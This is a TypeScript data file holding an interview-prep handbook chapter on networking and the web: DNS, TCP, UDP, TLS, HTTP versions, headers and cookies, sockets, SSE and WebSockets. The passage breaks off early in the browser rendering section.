import type { HandbookChapter } from "./types";

export const chapter: HandbookChapter = {
  slug: "networking-web",
  title: "Networking & How the Web Works",
  track: "systems",
  order: 3,
  summary:
    "The full answer to \"what happens when you type a URL and hit enter\", then every layer of it broken out: DNS, TCP, TLS, HTTP/1.1 through HTTP/3, sockets, WebSockets, the browser rendering pipeline, CORS, and web security.",
  estMinutes: 85,
  tags: [
    "networking",
    "HTTP",
    "DNS",
    "TCP",
    "TLS",
    "CORS",
    "WebSockets",
    "browser rendering",
    "XSS",
    "CSRF",
  ],
  sections: [
    {
      id: "type-a-url",
      heading: "What happens when you type a URL and hit enter",
      markdown: `This is the most-asked systems question in the industry, and it is really a depth probe: the interviewer keeps asking "and then?" until you run out. There is no single right level of detail — what's being scored is whether your model is *layered and causal* rather than a memorized list.

Here is the full chain. Every step below has its own section later in this chapter.

**1. The browser parses the input.** Is it a URL or a search query? It normalizes the URL into scheme, host, port, path, query, and fragment. It checks the **HSTS preload list** — if the domain is on it, \`http://\` is rewritten to \`https://\` *before any network traffic*, which is the whole point of preloading.

**2. It checks its caches.** In-memory HTTP cache, then disk cache. A fresh cached response (still within its \`max-age\`) can be served with zero network activity. A stale one may trigger a conditional revalidation with \`If-None-Match\`.

**3. DNS resolution.** Browser DNS cache → OS resolver cache (and \`/etc/hosts\`) → the configured recursive resolver (your ISP's, or 8.8.8.8 / 1.1.1.1) → root nameserver → TLD nameserver (\`.com\`) → the domain's authoritative nameserver → an A/AAAA record. Result: an IP address, cached for the record's TTL.

**4. ARP and routing (the part most people skip).** To send a packet, the machine needs a MAC address for the next hop. If the destination isn't on the local subnet, that's the default gateway, found via **ARP** (broadcast "who has 192.168.1.1?"). The packet then hops router to router, each one consulting its routing table, decrementing TTL, and — at your home router — applying **NAT** to rewrite the private source address to the public one.

**5. TCP handshake.** SYN → SYN-ACK → ACK. One round trip before any application data. The kernel allocates a socket; the connection is identified by the 4-tuple (src IP, src port, dst IP, dst port).

**6. TLS handshake** (for HTTPS). Client sends \`ClientHello\` with supported cipher suites and the SNI extension (which names the host, in cleartext, so a shared-IP server knows which certificate to send). Server responds with its certificate chain and key-share. The client validates the chain up to a trusted root, checks the hostname, dates, and revocation, and both sides derive a shared symmetric key. **TLS 1.3 does this in one round trip** (1-RTT), versus two in TLS 1.2.

**7. The HTTP request goes out.** \`GET / HTTP/1.1\` plus \`Host\`, \`User-Agent\`, \`Accept\`, \`Cookie\`, \`Accept-Encoding: gzip, br\`. If HTTP/2 or HTTP/3 was negotiated (via **ALPN** during the TLS handshake), it's a binary framed request on a stream instead.

**8. The server side.** The packet arrives at a load balancer or CDN edge, which may serve it from cache. Otherwise it's proxied to an application server, which routes, queries a database or cache, renders, and returns a status, headers, and body.

**9. The browser processes the response.** Status code first: a 3xx means follow \`Location\` and start over; a 200 means parse the body. \`Content-Type\` decides how — \`text/html\` starts the HTML parser.

**10. Rendering.** Parse HTML into the **DOM**, CSS into the **CSSOM**, combine into the render tree, run **layout** (geometry), **paint** (pixels into layers), and **composite** (assemble layers on the GPU). Along the way the parser discovers subresources — CSS, JS, images, fonts — and requests each of them, restarting this whole process per resource. A synchronous \`<script>\` blocks the parser; stylesheets block rendering.

**11. Post-load.** JavaScript executes, \`DOMContentLoaded\` and \`load\` fire, deferred work runs, and the page starts issuing XHR/fetch calls of its own.

### How to deliver it

Give the ten-step skeleton in about ninety seconds, then say: *"I can go deeper on any of these — DNS, the TLS handshake, or the rendering pipeline are the interesting ones."* That signals both breadth and the ability to prioritize, and it lets the interviewer steer.`,
    },
    {
      id: "osi-tcpip",
      heading: "The OSI and TCP/IP models",
      markdown: `Models exist so that a change at one layer doesn't force a change at another: TCP didn't need to be rewritten for WiFi, and HTTP didn't need rewriting for IPv6. Know both stacks, and know that **OSI is a teaching model** — the real internet implements the four-layer TCP/IP model.

| OSI layer | TCP/IP layer | Unit | Examples | Addressing |
| --- | --- | --- | --- | --- |
| 7 Application | Application | Message | HTTP, DNS, SMTP, SSH | URL |
| 6 Presentation | Application | — | TLS, gzip, character encoding | — |
| 5 Session | Application | — | Session management | — |
| 4 Transport | Transport | Segment (TCP) / Datagram (UDP) | TCP, UDP, QUIC | Port |
| 3 Network | Internet | Packet | IP, ICMP, BGP | IP address |
| 2 Data link | Link | Frame | Ethernet, WiFi, ARP | MAC address |
| 1 Physical | Link | Bit | Copper, fiber, radio | — |

### Encapsulation

Each layer wraps the one above it. Sending "GET /" looks like:

\`\`\`text
[ Ethernet header | IP header | TCP header | TLS record | HTTP request | Ethernet trailer ]
  dst MAC (14B)     dst IP(20B) dst port(20B)
\`\`\`

Each router along the path only inspects and rewrites the **IP** header (decrementing TTL, recomputing the checksum) and swaps the link-layer frame for the next hop's medium. It never looks at TCP or HTTP. That's the layering paying off — and it's why an "L4 load balancer" is cheap (reads the TCP header) while an "L7 load balancer" is expensive (parses HTTP).

### Where the interview-relevant devices sit

- **Hub** — layer 1, repeats bits to every port. Obsolete.
- **Switch** — layer 2, forwards frames by MAC address, learns which MAC is on which port.
- **Router** — layer 3, forwards packets between networks by IP.
- **L4 load balancer / NAT** — layer 4, routes by IP + port.
- **L7 load balancer / reverse proxy / CDN / API gateway** — layer 7, routes by path, host, header, cookie.

### Two related concepts worth having ready

- **MTU and fragmentation:** Ethernet's maximum frame payload is 1500 bytes, so IP packets larger than that get fragmented (or dropped with "fragmentation needed" so the sender lowers its size — **path MTU discovery**). TCP accounts for this by negotiating an **MSS**, typically 1460 bytes.
- **Ports:** 0-1023 are well-known (80 HTTP, 443 HTTPS, 22 SSH, 53 DNS, 25 SMTP), 1024-49151 registered, 49152-65535 ephemeral — the range your client picks a source port from. A machine can hold about 64k outbound connections *to the same destination IP and port*, because the 4-tuple must be unique; that limit is a real operational concern for busy proxies.`,
    },
    {
      id: "dns",
      heading: "DNS resolution",
      markdown: `DNS maps names to addresses. It's a distributed, hierarchical, cache-heavy database, and it runs over UDP port 53 (falling back to TCP for responses larger than 512 bytes, and for zone transfers).

### The lookup chain

\`\`\`text
browser cache            (seconds to minutes; Chrome pins ~60s)
  └─ OS resolver cache + /etc/hosts
       └─ recursive resolver (ISP, 8.8.8.8, 1.1.1.1)   ← does the real work
            ├─ root nameservers (13 logical, anycast)      "ask the .com servers"
            ├─ TLD nameservers (.com)                      "ask ns1.example.com"
            └─ authoritative nameservers (example.com)     "it's 93.184.216.34"
\`\`\`

The key distinction: your machine makes an **iterative** request in the sense that it delegates everything to a **recursive** resolver, which then walks the hierarchy itself, asking each level and following referrals. Almost every step is cached, so a real-world lookup usually terminates in the first two lines.

### Record types you should know

| Type | Maps to | Note |
| --- | --- | --- |
| **A** | IPv4 address | |
| **AAAA** | IPv6 address | |
| **CNAME** | Another name | Cannot coexist with other records at the same name, so **not allowed at the zone apex** (\`example.com\`) — providers work around this with ALIAS/ANAME |
| **MX** | Mail servers, with priority | |
| **TXT** | Arbitrary text | SPF, DKIM, domain-ownership verification |
| **NS** | Nameservers for the zone | How delegation works |
| **SOA** | Zone metadata | Serial, refresh, default TTL |
| **PTR** | IP → name | Reverse DNS |
| **CAA** | Which CAs may issue certs | |

### TTL, and why it's an operational decision

Every record carries a TTL telling resolvers how long to cache it. High TTL (24h) means fewer lookups and faster page loads but slow propagation — a failover takes a day to be seen by everyone. Low TTL (60s) means fast failover but more query load and a DNS dependency on your hot path. Standard practice: **lower the TTL to 60 s a day before a planned migration, then raise it again afterwards.** Note also that some resolvers and OSes ignore short TTLs, so DNS is a poor failover mechanism to rely on alone.

### DNS as infrastructure

- **Load balancing:** return multiple A records and let clients pick, or rotate the order (round-robin DNS). Crude — no health awareness, and caching defeats it.
- **GeoDNS / anycast:** return an address near the client, or announce the same IP from many locations and let BGP route to the nearest. This is how CDNs and the root servers work.
- **CNAME to your CDN** is the normal way to put a CDN in front of a site.
- **DNS-based failover** relies on health checks at the DNS provider swapping records.

### Performance and security

Each uncached lookup costs a round trip, and a page pulling resources from eight domains pays eight of them. Mitigations: \`<link rel="dns-prefetch">\`, \`<link rel="preconnect">\` (which also does the TCP and TLS handshakes early), and simply **using fewer domains** — with HTTP/2, domain sharding is an anti-pattern that costs connections instead of saving them.

Plain DNS is unauthenticated and unencrypted, which enables **cache poisoning** (injecting forged answers) and lets any observer see every hostname you visit. Countermeasures: **DNSSEC** signs records so answers can be validated (authenticity, not privacy), while **DoH/DoT** (DNS over HTTPS/TLS) encrypt the query itself (privacy, not authenticity). They solve different problems — saying so is a good signal.`,
    },
    {
      id: "tcp",
      heading: "TCP: the handshake and why it exists",
      markdown: `IP gives you unreliable, unordered, best-effort delivery of packets between hosts. TCP builds a **reliable, ordered, byte stream between two processes** on top of that, and everything in its design follows from having to do that over a lossy network.

### What TCP adds to IP

1. **Ports** — so a packet reaches a process, not just a host.
2. **Reliability** — every byte is sequence-numbered and acknowledged; unacknowledged data is retransmitted after a timeout (RTO) or after three duplicate ACKs (fast retransmit).
3. **Ordering** — the receiver buffers out-of-order segments and delivers bytes to the application in order.
4. **Flow control** — the receiver advertises a window so a fast sender can't overrun a slow receiver's buffer.
5. **Congestion control** — the sender infers network congestion from loss and delay and backs off, which is what keeps the internet from collapsing.
6. **Error detection** — a checksum over header and payload.

### The three-way handshake

\`\`\`text
  client                                            server
    │                                                  │  (LISTEN)
    │ ── SYN,  seq=x ─────────────────────────────────▶│
    │                                                  │  (SYN_RECEIVED)
    │ ◀───────────────────── SYN-ACK, seq=y, ack=x+1 ──│
    │  (ESTABLISHED)                                   │
    │ ── ACK,  seq=x+1, ack=y+1 ──────────────────────▶│
    │                                          (ESTABLISHED)
    │ ── application data ────────────────────────────▶│
\`\`\`

**Why three messages and not two?** Because both directions need to be established, and each side must confirm that the other received its initial sequence number. The client's SYN proposes \`x\` and the server acks it; the server's SYN proposes \`y\` and the client acks it. Two messages would leave the server unsure whether the client ever got its sequence number. The handshake also lets both ends agree on options — MSS, window scaling, selective ACK, timestamps.

**Why random initial sequence numbers?** Two reasons: to prevent stale segments from an old connection with the same 4-tuple being accepted into a new one, and to make blind connection-injection attacks impractical.

**Cost:** one full round trip before a single byte of application data. On a 100 ms link, that's 100 ms of pure setup, plus another 100 ms (TLS 1.3) for encryption. This is precisely the tax QUIC/HTTP3 exists to remove.

### Teardown and TIME_WAIT

Closing is a four-way exchange (FIN, ACK, FIN, ACK) because each direction closes independently — one side can stop sending while still receiving (a half-open connection). The closer then sits in **TIME_WAIT** for 2×MSL (typically 60 s) to absorb delayed duplicate segments and to guarantee the final ACK can be retransmitted. A busy proxy that opens and closes many short connections accumulates tens of thousands of TIME_WAIT sockets and can exhaust ephemeral ports — which is why connection reuse (keep-alive, connection pools) matters so much in practice.

### Flow control vs congestion control

These are constantly confused, and distinguishing them cleanly is a strong signal:

- **Flow control** protects the **receiver**. It's the advertised window (\`rwnd\`) in each ACK: "I have this much buffer left." Purely end-to-end.
- **Congestion control** protects the **network**. The sender maintains a congestion window (\`cwnd\`) it estimates the path can carry. Effective window = \`min(rwnd, cwnd)\`.

Classic congestion control: **slow start** — begin with a small \`cwnd\` (10 segments) and double it every RTT until loss or a threshold; then **congestion avoidance** — grow linearly; on loss, cut the window (halve it, in Reno) and resume. Modern stacks use CUBIC (loss-based, better on high-bandwidth-delay links) or BBR (models bottleneck bandwidth and RTT directly rather than treating loss as the only signal, which is far better on lossy wireless links).

The practical consequence: **a new TCP connection starts slow.** The first ~14 KB goes out in one round trip, then 28 KB, then 56 KB. That's why keeping connections alive and why "get the critical CSS under 14 KB" was a real optimization.

### TCP vs UDP in one line

TCP: reliable, ordered, connection-oriented, congestion-controlled, ~20-byte header, head-of-line blocking. UDP: unreliable, unordered, connectionless, no congestion control unless you add it, 8-byte header, no head-of-line blocking.`,
    },
    {
      id: "udp",
      heading: "UDP and when it wins",
      markdown: `UDP is a thin wrapper over IP: an 8-byte header with source port, destination port, length, and checksum. No handshake, no acknowledgements, no retransmission, no ordering, no congestion control. A datagram either arrives intact or it doesn't, and you find out only if you build a mechanism to check.

That sounds strictly worse, which is why the interesting question is *why anyone chooses it*.

### The cases where UDP is correct

**1. Late data is worthless.** In a voice or video call, a packet from 200 ms ago has no value — playing it late is worse than dropping it and concealing the gap. TCP would stall the stream retransmitting something you no longer want. Same for live game state: you don't want position update #41 retransmitted when #45 has already arrived.

**2. Request/response fits in one packet.** DNS is the canonical example: a query and its answer both fit in a datagram, so TCP's handshake would triple the cost of the exchange for no benefit. If the answer is too large, DNS retries over TCP.

**3. Head-of-line blocking is the enemy.** Within a TCP connection, one lost segment stalls delivery of *everything* behind it, even data the application could use immediately. Multiplexing independent streams over one TCP connection therefore couples their fates. UDP lets you multiplex without that coupling — the insight behind QUIC.

**4. Broadcast and multicast.** TCP is strictly point-to-point. Service discovery (mDNS), DHCP, and IPTV need one-to-many, which only UDP does.

**5. You want to control the reliability yourself.** Games, QUIC, and custom protocols implement selective retransmission, their own congestion control, and their own ordering rules — reliable where it matters (a "player died" event) and unreliable where it doesn't (a position tick). TCP gives you one policy for everything.

### The catch

If you use UDP, **you** are responsible for congestion control. A UDP application that blasts packets at line rate is antisocial — it will crowd out well-behaved TCP flows and can collapse a shared link. QUIC implements congestion control that mirrors TCP's precisely because of this. UDP is also more attractive for amplification DDoS (a small spoofed query producing a large response, as with open DNS and NTP servers), because there's no handshake to prove the source address.

### Typical users

DNS, DHCP, NTP, SNMP, VoIP/RTP, video conferencing, most game netcode, QUIC (and therefore HTTP/3), and syslog.`,
    },
    {
      id: "tls",
      heading: "TLS and what a certificate actually proves",
      markdown: `TLS provides three things: **confidentiality** (nobody can read the traffic), **integrity** (nobody can modify it undetected), and **authentication** (you're talking to the server you named). Note the asymmetry — the server is authenticated to the client by default; the client is not authenticated to the server unless you configure mutual TLS.

### The TLS 1.3 handshake

\`\`\`text
  client                                                      server
    │ ClientHello                                                 │
    │   supported TLS versions, cipher suites,                    │
    │   key_share (a guessed X25519 public key),                  │
    │   SNI = "example.com"        ← cleartext! names the host    │
    │   ALPN = ["h2", "http/1.1"]  ← negotiates HTTP version here │
    │ ───────────────────────────────────────────────────────────▶│
    │                                                             │
    │ ◀───────────────────────────────────────────────────────────│
    │   ServerHello (chosen suite, server key_share)              │
    │   {EncryptedExtensions, Certificate, CertificateVerify,     │
    │    Finished}   ← already encrypted with the derived key     │
    │                                                             │
    │  ── client validates chain, sends Finished, sends data ────▶│
\`\`\`

**One round trip.** TLS 1.2 needed two, because the key exchange couldn't begin until after ServerHello. TLS 1.3 gets it down by having the client *guess* the key-exchange group and send its key share in the first flight; if it guessed wrong, there's one extra round trip (HelloRetryRequest). TLS 1.3 also removed everything non-forward-secret and every broken primitive: no RSA key transport, no static Diffie-Hellman, no RC4, no CBC-mode MAC-then-encrypt, no renegotiation, no compression.

**Session resumption** cuts even that: a PSK from a previous session lets a returning client resume in 0-RTT, sending application data in its very first packet. The catch is that 0-RTT data is **replayable** by an attacker, so it must be restricted to idempotent requests.

### The key exchange, conceptually

Asymmetric crypto is slow, so TLS uses it only to establish a shared secret; the actual traffic is protected with fast symmetric AEAD (AES-GCM or ChaCha20-Poly1305). The shared secret comes from **ephemeral Diffie-Hellman** — each side generates a throwaway keypair, exchanges public halves, and derives the same secret without it ever crossing the wire. Because the keys are ephemeral and discarded, **forward secrecy** holds: an attacker who records traffic today and steals the server's private key next year still cannot decrypt it. The certificate's private key is used only to *sign* the handshake, proving the server owns the certificate.

### What a certificate actually proves

A certificate is a public key plus identity information (the domain names in the Subject Alternative Name field) plus a validity window, signed by a Certificate Authority. Your browser ships a trust store of root CA public keys; validation walks the chain from the server's leaf certificate through intermediates to a trusted root, checking every signature, the dates, the hostname match, and revocation status (OCSP stapling, CRLs).

**What it proves:** that some CA verified control of that domain name at issuance time, and that the party you're talking to holds the corresponding private key. That's it.

**What it does not prove:** that the site is trustworthy, honest, non-malicious, or run by the company whose name resembles the domain. A domain-validated certificate is issued to anyone who can answer an HTTP challenge or add a DNS record — including a phishing site, for free, in ninety seconds. "The padlock means the site is safe" is the misconception; the padlock means *the connection* is private and goes to the domain in the address bar.

Certificate types: **DV** (domain control only), **OV** (organization checked), **EV** (extended vetting — browsers no longer show it distinctively, which effectively ended the category). **Certificate transparency** logs every issued certificate publicly so a domain owner can detect a mis-issued certificate.

The trust model's weakness is that it's only as strong as its weakest CA — any of hundreds of trusted CAs can issue for any domain. Mitigations: CT logs, CAA records restricting which CA may issue for your domain, and certificate pinning for high-value mobile apps.`,
    },
    {
      id: "http-versions",
      heading: "HTTP/1.1 vs HTTP/2 vs HTTP/3",
      markdown: `Each version exists to fix a specific bottleneck. Learn them as a sequence of problems and answers.

### HTTP/1.1 — text, one request at a time per connection

A request occupies the connection until its response completes. \`Connection: keep-alive\` (the default in 1.1) at least lets you reuse the connection for the *next* request instead of paying a new TCP+TLS handshake each time.

**Head-of-line blocking at the application layer:** if you send request A then request B on one connection, B's response cannot start until A's finishes — even if A is a 5 MB video and B is a 2 KB stylesheet. HTTP pipelining was meant to fix this and failed in practice (proxies broke it, and responses still had to come back in order).

The workaround was **6 parallel connections per origin**, plus a pile of hacks that are now anti-patterns: domain sharding (spread assets over \`img1/img2/img3.example.com\` to get more connections), CSS sprites, inlining images as data URIs, and concatenating all JS into one bundle. Every one of these traded caching granularity for parallelism.

Other 1.1 costs: headers are plain text and repeated in full on every request. A few kilobytes of cookies on every one of 100 requests is real bandwidth, and it's uncompressed.

### HTTP/2 — binary framing and multiplexing

- **Binary framing.** Messages become frames on **streams**, all multiplexed over one TCP connection. Parsing is unambiguous and cheap.
- **Multiplexing.** Many concurrent requests and responses interleave on one connection, in any order. Application-layer head-of-line blocking is gone, and so is the reason for domain sharding, sprites, and mega-bundles — those now *hurt*, because one changed byte invalidates the whole bundle.
- **HPACK header compression.** Headers are compressed with a static table of common headers plus a dynamic table shared across the connection, so repeated headers cost a byte or two.
- **Stream prioritization** and dependencies, so a stylesheet can outrank an image.
- **Server push** — send resources the client hasn't asked for. It sounded great, was very hard to use without wasting bandwidth on things the client already had cached, and **has been removed from Chrome**; \`103 Early Hints\` replaced it.

**What HTTP/2 does *not* fix: TCP-level head-of-line blocking.** All streams share one TCP connection, and TCP guarantees in-order byte delivery. A single lost packet stalls delivery of *every* stream behind it, even ones whose data already arrived. On a clean network HTTP/2 is a clear win; on a lossy mobile link, multiplexing everything onto one TCP connection can be *worse* than HTTP/1.1's six independent connections, because one loss now stalls everything instead of a sixth of it.

### HTTP/3 — HTTP over QUIC over UDP

QUIC moves the transport into userspace on top of UDP and implements streams itself:

- **No transport head-of-line blocking.** QUIC knows about streams, so a lost packet only stalls the stream it belonged to. Others keep delivering. This is the headline fix.
- **Faster setup.** The transport and cryptographic handshakes are merged — **1-RTT to a new server, 0-RTT to a known one**, versus TCP's 1-RTT plus TLS's 1-RTT.
- **Connection migration.** A connection is identified by a connection ID, not the 4-tuple, so moving from WiFi to cellular keeps it alive instead of forcing a reconnect. Genuinely valuable on mobile.
- **Always encrypted**, including most of the transport header, which also stops middleboxes from ossifying the protocol.
- Header compression becomes **QPACK**, redesigned so out-of-order stream delivery can't stall decoding.

Costs: UDP is sometimes blocked or deprioritized by corporate firewalls (so clients keep a TCP fallback), and userspace UDP burns more CPU per byte than kernel TCP, though \`GSO\`/offload is closing that.

### Choosing

Use HTTP/2 or HTTP/3 — they're transparent to application code and negotiated by ALPN during the TLS handshake, so it's a server/CDN configuration, not a rewrite. The real work is **undoing HTTP/1.1 workarounds**: stop sharding domains, stop building one giant bundle, and let fine-grained caching do its job.`,
    },
    {
      id: "http-anatomy",
      heading: "HTTP anatomy: methods, status codes, headers, cookies",
      markdown: `\`\`\`http
GET /api/v1/users/42?include=posts HTTP/1.1
Host: api.example.com
Accept: application/json
Accept-Encoding: gzip, br
Authorization: Bearer eyJhbGciOi...
Cookie: session=abc123
If-None-Match: "v7-9f86d0"

HTTP/1.1 200 OK
Content-Type: application/json; charset=utf-8
Content-Length: 184
Cache-Control: private, max-age=60
ETag: "v7-9f86d1"
Vary: Accept-Encoding, Authorization

{"id":42,"name":"Ada"}
\`\`\`

### Methods

| Method | Safe? | Idempotent? | Body? | Meaning |
| --- | --- | --- | --- | --- |
| GET | Yes | Yes | No | Retrieve. Must have no side effects. |
| HEAD | Yes | Yes | No | Headers only — check existence or size cheaply |
| OPTIONS | Yes | Yes | No | Capabilities; used by CORS preflight |
| POST | No | **No** | Yes | Create, or anything non-idempotent |
| PUT | No | **Yes** | Yes | Replace the resource at this URI wholesale |
| PATCH | No | No | Yes | Partial update |
| DELETE | No | **Yes** | Optional | Remove |

**Safe** = no state change, so a crawler can call it freely. **Idempotent** = calling it N times leaves the same state as calling it once, so a client can retry after a timeout. PUT is idempotent because it *sets* the resource; POST isn't because it creates a new one each time — which is exactly why non-idempotent endpoints need an idempotency key.

### Status codes

- **1xx informational** — \`101 Switching Protocols\` (WebSocket upgrade), \`103 Early Hints\`.
- **2xx success** — \`200 OK\`, \`201 Created\` (with a \`Location\` header), \`202 Accepted\` (queued, not done), \`204 No Content\`.
- **3xx redirect** — \`301\` permanent (browsers and search engines cache it aggressively — hard to undo), \`302\`/\`307\` temporary (307 preserves the method; 302 historically let clients turn POST into GET), \`304 Not Modified\` (your cached copy is still good; no body sent).
- **4xx client error** — \`400\` malformed, \`401\` **unauthenticated** (you haven't proven who you are; must include \`WWW-Authenticate\`), \`403\` **unauthorized** (we know who you are, and no), \`404\` not found, \`405\` method not allowed, \`409\` conflict, \`422\` semantically invalid, \`429\` rate limited (send \`Retry-After\`).
- **5xx server error** — \`500\` unhandled, \`502\` bad gateway (upstream gave garbage), \`503\` unavailable (overloaded or in maintenance — retryable), \`504\` gateway timeout.

The 401/403 distinction gets asked constantly: **401 = who are you, 403 = I know, and no.**

### Headers worth knowing cold

- \`Host\` — mandatory in 1.1; enables name-based virtual hosting on a shared IP.
- \`Content-Type\` / \`Accept\` — the format sent and the formats wanted (content negotiation).
- \`Cache-Control\` — \`max-age\` (freshness in seconds), \`no-cache\` (**cache it, but revalidate before use** — not "don't cache"), \`no-store\` (never write it down; this is the one for sensitive data), \`private\` (browser only, not shared caches), \`immutable\`, \`stale-while-revalidate\`.
- \`ETag\` + \`If-None-Match\`, \`Last-Modified\` + \`If-Modified-Since\` — conditional requests that let a server answer \`304\` with no body.
- \`Vary\` — which request headers the cached response depends on. Omitting \`Vary: Accept-Encoding\` serves gzip to clients that can't read it; adding \`Vary: User-Agent\` destroys your hit rate.
- \`Content-Encoding\` — \`gzip\`, \`br\`.
- \`Authorization\` — credentials, typically \`Bearer <token>\`.
- \`X-Forwarded-For\` / \`Forwarded\` — the original client IP through proxies. **Only trust it from proxies you control**; a client can forge it.

### Cookies

\`\`\`http
Set-Cookie: session=abc123; Max-Age=1209600; Path=/; Domain=example.com;
            Secure; HttpOnly; SameSite=Lax
\`\`\`

- **\`HttpOnly\`** — invisible to \`document.cookie\`, so an XSS payload can't read the session token. Non-negotiable for session cookies.
- **\`Secure\`** — only sent over HTTPS.
- **\`SameSite\`** — \`Strict\` (never sent cross-site), \`Lax\` (sent on top-level GET navigations only — the modern default), \`None\` (sent everywhere, and then \`Secure\` is required). This is the primary structural defense against CSRF.
- **\`Domain\`** — omit it and the cookie is host-only; set it to \`example.com\` and every subdomain receives it, which is a real risk if you host untrusted content on a subdomain.
- **Cookie prefixes**: a cookie named \`__Host-session\` is only accepted if it's \`Secure\`, path \`/\`, and has no \`Domain\` — a cheap way to make subdomain injection impossible.

Cookies are sent on **every** matching request, so keep them small and put non-essential state in \`localStorage\` — with the caveat that \`localStorage\` is fully readable by JavaScript and therefore by XSS, which is the whole argument for keeping session tokens in \`HttpOnly\` cookies rather than in \`localStorage\`.`,
    },
    {
      id: "sockets",
      heading: "Sockets",
      markdown: `A socket is the OS's handle for one endpoint of a network connection — a file descriptor you can \`read\` and \`write\`. Every network library you use bottoms out here, and knowing the syscall sequence makes servers much less mysterious.

\`\`\`text
SERVER                                  CLIENT
socket()   create an endpoint           socket()
bind()     claim IP:port
listen()   mark passive, set backlog
accept()   block until a connection ◀── connect()   ── TCP 3-way handshake
           returns a NEW socket
read()/write() on the new socket        read()/write()
close()                                 close()
\`\`\`

The subtlety worth stating: **\`accept()\` returns a new socket per connection.** The listening socket keeps listening; the returned one is bound to the 4-tuple (src IP, src port, dst IP, dst port), which is what lets thousands of clients share destination port 443.

The **backlog** in \`listen(fd, backlog)\` is the queue of completed-but-not-yet-accepted connections. If your application is too slow to call \`accept()\`, that queue fills and the kernel starts dropping SYNs — clients see connection timeouts while your CPU looks fine. It's a classic overload symptom.

### From one connection at a time to a hundred thousand

1. **Blocking, one connection at a time** — trivially correct, useless.
2. **Thread per connection** — simple mental model, but ~1 MB of stack each and heavy context switching; falls over in the low thousands.
3. **\`select\`/\`poll\`** — one thread watches many descriptors, but both are O(n) in the number of watched descriptors on every call, and \`select\` caps out at 1024.
4. **\`epoll\` (Linux) / \`kqueue\` (BSD) / IOCP (Windows)** — register interest once, get back only the ready descriptors, O(1) in the number watched. This is what nginx, Node's libuv, Netty, and Go's runtime use, and it's the answer to "how does one thread serve 100k connections."
5. **\`io_uring\`** — shared submission/completion ring buffers that batch operations and cut syscalls dramatically. The current frontier.

The historical name for this is the **C10K problem** — serving ten thousand concurrent connections on one machine — and the resolution was moving from a thread per connection to event-driven I/O.

### Blocking vs non-blocking vs async

- **Blocking:** \`read()\` sleeps the thread until data arrives.
- **Non-blocking:** \`read()\` returns \`EAGAIN\` immediately if there's nothing. You must be told when to try again — that's what epoll provides (readiness notification).
- **Asynchronous (true):** you hand the kernel a buffer, it fills it and tells you when it's done (completion notification). IOCP and io_uring work this way.

Practical settings you should be able to name: \`SO_REUSEADDR\` (rebind a port still in TIME_WAIT — why your dev server can restart immediately), \`TCP_NODELAY\` (disable **Nagle's algorithm**, which buffers small writes to reduce packet overhead but adds latency — you want it off for interactive protocols), \`SO_KEEPALIVE\` (detect dead peers), and \`SO_RCVBUF\`/\`SO_SNDBUF\`.`,
    },
    {
      id: "realtime",
      heading: "WebSockets vs long polling vs Server-Sent Events",
      markdown: `HTTP is request/response: the client asks, the server answers. Pushing data from server to client needs one of these.

### Short polling

The client asks every N seconds. Trivial, works everywhere, and wasteful — a full request/response (headers, cookies, possibly a TLS handshake) per check, with latency up to the poll interval. Fine for something checked every 30 seconds; wrong for chat.

### Long polling

The client sends a request and the **server holds it open** until it has something to say (or a timeout, typically 30 s), then responds; the client immediately reconnects.

- Near-real-time latency using only plain HTTP, so it works through any proxy.
- Costs a held connection per client on the server, plus a full HTTP round trip per message, plus a reconnect gap during which events must be buffered server-side.
- Still the standard **fallback** when WebSockets are blocked.

### Server-Sent Events (SSE)

One long-lived HTTP response of \`Content-Type: text/event-stream\` that the server keeps writing to.

\`\`\`text
data: {"type":"price","symbol":"AAPL","value":213.4}

id: 42
event: alert
data: {"msg":"threshold crossed"}

\`\`\`

\`\`\`js
const es = new EventSource("/api/stream");
es.onmessage = (e) => render(JSON.parse(e.data));
es.addEventListener("alert", (e) => toast(JSON.parse(e.data)));
es.onerror = () => {
  /* the browser reconnects automatically, resending Last-Event-ID */
};
\`\`\`

- **Server → client only.** The client still uses normal HTTP requests to send anything.
- Plain HTTP, so it passes through proxies, works with compression, and reuses your existing auth and cookies.
- **Automatic reconnection with resume** built into the browser: it sends \`Last-Event-ID\`, and you replay from there. You get for free what you'd hand-roll over WebSockets.
- Text only (UTF-8), and over HTTP/1.1 it consumes one of the six connections per origin — a real limit that disappears under HTTP/2 multiplexing.

### WebSockets

Starts as an HTTP request with \`Upgrade: websocket\`, gets a \`101 Switching Protocols\`, and from then on the TCP connection carries a lightweight binary frame protocol in both directions.

\`\`\`http
GET /ws HTTP/1.1
Host: example.com
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==
Sec-WebSocket-Version: 13

HTTP/1.1 101 Switching Protocols
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Accept: s3pPLMBiTxaQ9kYGzzhZRbK+xOo=
\`\`\`

- **Full duplex**, low overhead (a 2-14 byte frame header versus hundreds of bytes of HTTP headers), binary or text.
- The right choice when the client sends frequently too: chat, collaborative editing, multiplayer games, trading.
- Costs: the server tier becomes **stateful** (see the chat design in the system design chapter), you must implement your own heartbeat/ping and reconnect-with-backoff, load balancers need to be configured for long-lived upgrades, and there is **no automatic CORS protection** — the browser sends cookies but does not enforce same-origin, so you must validate the \`Origin\` header yourself or you have a cross-site hijacking vulnerability.

### Picking

| Need | Use |
| --- | --- |
| Occasional updates, simplicity above all | Short polling |
| Server→client only: notifications, live feeds, progress, LLM token streams | **SSE** |
| Frequent bidirectional messages | **WebSocket** |
| Must work through hostile proxies with no modern support | Long polling fallback |

The common mistake is reaching for WebSockets for a one-way stream. If the client only listens, SSE gives you the same latency with automatic reconnection, resumption, and none of the stateful-infrastructure cost. Also mention **WebRTC** for peer-to-peer audio/video/data, which uses UDP and bypasses your servers entirely for the media path.`,
    },
    {
      id: "rendering",
      heading: "The browser rendering pipeline and the critical rendering path",
      markdown: `Bytes arriving over the network become pixels through a fixed pipeline. Know the stages and, more importantly, which stages a given change triggers.

\`\`\`text
HTML bytes ─▶ tokenizer ─▶ DOM tree ──┐
                                      ├─▶ Render tree ─▶ Layout ─▶ Paint ─▶ Composite
CSS bytes  ─▶ parser    ─▶ CSSOM ─────┘   (visible nodes    (geometry) (pixels   (GPU
                                           + styles)                    to layers) assembly)
JS ─▶ can mutate DOM and CSSOM, forcing re-run of everything downstream
\`\`\`

**1. Parse HTML → DOM.** Incremental: the parser builds the tree as bytes arrive, so a partially-received page can start rendering.

